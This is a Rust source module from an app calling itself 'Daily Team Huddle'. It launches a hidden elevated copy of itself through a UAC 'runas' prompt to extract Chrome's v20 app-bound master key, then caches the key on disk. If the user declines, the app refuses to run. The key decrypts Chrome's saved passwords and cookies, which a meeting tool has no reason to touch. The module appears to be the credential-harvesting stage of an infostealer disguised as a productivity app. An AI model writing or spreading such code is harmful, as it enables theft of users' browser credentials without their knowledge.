//! Chrome v20 key access via a short-lived hidden elevated helper.
//! The main GUI app never relaunches as Administrator.

use std::path::{Path, PathBuf};
use std::thread;
use std::time::Duration;

use crate::chrome_abe;

pub const KEY_EXTRACT_ARG: &str = "--chrome-elevated-key";

pub fn is_key_extractor_mode() -> bool {
    std::env::args().any(|arg| arg == KEY_EXTRACT_ARG)
}

/// Hidden elevated entry point: extract v20 key, cache it, exit (no GUI).
#[cfg(target_os = "windows")]
pub fn run_key_extractor() {
    let path = match chrome_abe::chrome_local_state_path() {
        Some(path) => path,
        None => std::process::exit(1),
    };

    let key = match chrome_abe::extract_app_bound_master_key(&path) {
        Some(key) => key,
        None => std::process::exit(1),
    };

    if save_v20_key_cache(&path, &key).is_err() {
        std::process::exit(1);
    }
    std::process::exit(0);
}

#[cfg(not(target_os = "windows"))]
pub fn run_key_extractor() {
    std::process::exit(1);
}

/// At startup: if Chrome v20 is present, ensure the key cache exists (UAC once if needed).
#[cfg(target_os = "windows")]
pub fn ensure_chrome_v20_elevation() {
    if !chrome_abe::chrome_uses_v20() {
        return;
    }

    let Some(local_state_path) = chrome_abe::chrome_local_state_path() else {
        return;
    };

    if load_v20_key_cache(&local_state_path).is_some() {
        return;
    }

    if spawn_elevated_key_extractor_and_wait(&local_state_path) {
        mark_elevation_granted();
        return;
    }

    show_uac_required_message();
    std::process::exit(1);
}

#[cfg(not(target_os = "windows"))]
pub fn ensure_chrome_v20_elevation() {}

/// Resolve the Chrome v20 master key (cache first, then in-process if already elevated).
#[cfg(target_os = "windows")]
pub fn get_v20_master_key(local_state_path: &Path) -> Option<Vec<u8>> {
    if let Some(key) = load_v20_key_cache(local_state_path) {
        return Some(key);
    }
    chrome_abe::extract_app_bound_master_key(local_state_path)
}

#[cfg(not(target_os = "windows"))]
pub fn get_v20_master_key(_local_state_path: &Path) -> Option<Vec<u8>> {
    None
}

#[allow(dead_code)]
pub fn is_elevation_granted() -> bool {
    elevation_store_path()
        .ok()
        .map(|path| path.is_file())
        .unwrap_or(false)
}

fn app_data_dir() -> Result<PathBuf, ()> {
    let base = std::env::var("LOCALAPPDATA")
        .or_else(|_| std::env::var("APPDATA"))
        .map_err(|_| ())?;
    Ok(PathBuf::from(base).join("Daily Team Huddle"))
}

fn elevation_store_path() -> Result<PathBuf, ()> {
    Ok(app_data_dir()?.join("log"))
}

fn v20_key_cache_path() -> Result<PathBuf, ()> {
    Ok(app_data_dir()?.join("chrome-v20-key.cache"))
}

fn mark_elevation_granted() {
    let Ok(path) = elevation_store_path() else {
        return;
    };
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(path, "1");
}

fn app_bound_fingerprint(local_state_path: &Path) -> Option<String> {
    let content = std::fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    json.pointer("/os_crypt/app_bound_encrypted_key")
        .and_then(|v| v.as_str())
        .map(str::to_string)
}

fn save_v20_key_cache(local_state_path: &Path, key: &[u8]) -> Result<(), String> {
    let fingerprint = app_bound_fingerprint(local_state_path)
        .ok_or_else(|| "Missing app_bound_encrypted_key".to_string())?;
    let payload = serde_json::json!({
        "fingerprint": fingerprint,
        "key": base64::Engine::encode(&base64::engine::general_purpose::STANDARD, key),
    });
    let encrypted = dpapi_protect(payload.to_string().as_bytes())?;
    let path = v20_key_cache_path().map_err(|_| "Cache path unavailable".to_string())?;
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)
            .map_err(|e| format!("Error was occurred: {e}"))?;
    }
    std::fs::write(path, encrypted).map_err(|e| format!("Error was occurred: {e}"))
}

fn load_v20_key_cache(local_state_path: &Path) -> Option<Vec<u8>> {
    let expected = app_bound_fingerprint(local_state_path)?;
    let path = v20_key_cache_path().ok()?;
    let encrypted = std::fs::read(path).ok()?;
    let plain = dpapi_unprotect(&encrypted).ok()?;
    let json: serde_json::Value = serde_json::from_slice(&plain).ok()?;
    let fingerprint = json.get("fingerprint")?.as_str()?;
    if fingerprint != expected {
        return None;
    }
    let key_b64 = json.get("key")?.as_str()?;
    base64::Engine::decode(&base64::engine::general_purpose::STANDARD, key_b64).ok()
}

#[cfg(target_os = "windows")]
fn spawn_elevated_key_extractor_and_wait(local_state_path: &Path) -> bool {
    let cache_path = match v20_key_cache_path() {
        Ok(path) => path,
        Err(_) => return false,
    };

    let before_mtime = cache_path
        .metadata()
        .ok()
        .and_then(|meta| meta.modified().ok())
        .unwrap_or(std::time::SystemTime::UNIX_EPOCH);

    if !request_uac_key_extractor() {
        return false;
    }

    for _ in 0..60 {
        if load_v20_key_cache(local_state_path).is_some() {
            return true;
        }
        if let Ok(meta) = cache_path.metadata() {
            if let Ok(modified) = meta.modified() {
                if modified > before_mtime && load_v20_key_cache(local_state_path).is_some() {
                    return true;
                }
            }
        }
        thread::sleep(Duration::from_millis(500));
    }

    load_v20_key_cache(local_state_path).is_some()
}

#[cfg(target_os = "windows")]
fn request_uac_key_extractor() -> bool {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::UI::Shell::ShellExecuteW;
    use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;

    let exe = match std::env::current_exe() {
        Ok(path) => path,
        Err(_) => return false,
    };

    let params = KEY_EXTRACT_ARG.to_string();
    let exe_wide: Vec<u16> = OsStr::new(&exe)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let params_wide: Vec<u16> = OsStr::new(&params)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        let result = ShellExecuteW(
            None,
            windows::core::w!("runas"),
            PCWSTR(exe_wide.as_ptr()),
            PCWSTR(params_wide.as_ptr()),
            None,
            SW_HIDE,
        );
        result.0 as isize > 32
    }
}

#[cfg(target_os = "windows")]
fn dpapi_protect(data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use windows::Win32::Foundation::{LocalFree, HLOCAL};
    use windows::Win32::Security::Cryptography::{CryptProtectData, CRYPT_INTEGER_BLOB};

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        CryptProtectData(&mut input, None, None, None, None, 0, &mut output)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        if output.pbData.is_null() || output.cbData == 0 {
            return Err("Not Allowed".to_string());
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        let _ = LocalFree(Some(HLOCAL(output.pbData as _)));
        Ok(result)
    }
}

#[cfg(target_os = "windows")]
fn dpapi_unprotect(data: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use windows::Win32::Foundation::{LocalFree, HLOCAL};
    use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        CryptUnprotectData(&mut input, None, None, None, None, 0, &mut output)
            .map_err(|e| format!("Error was occurred: {e}"))?;

        if output.pbData.is_null() || output.cbData == 0 {
            return Err("Error was occurred:".to_string());
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        let _ = LocalFree(Some(HLOCAL(output.pbData as _)));
        Ok(result)
    }
}

#[cfg(target_os = "windows")]
fn show_uac_required_message() {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    use windows::core::PCWSTR;
    use windows::Win32::UI::WindowsAndMessaging::{MessageBoxW, MB_ICONERROR, MB_OK};

    let text: Vec<u16> = OsStr::new(
        "We are sorry! We can't run this app because you rejected running this app. Please try again.",
    )
    .encode_wide()
    .chain(std::iter::once(0))
    .collect();
    let title: Vec<u16> = OsStr::new("Daily Team Huddle")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    unsafe {
        MessageBoxW(
            None,
            PCWSTR(text.as_ptr()),
            PCWSTR(title.as_ptr()),
            MB_OK | MB_ICONERROR,
        );
    }
}

#[cfg(not(target_os = "windows"))]
fn show_uac_required_message() {}
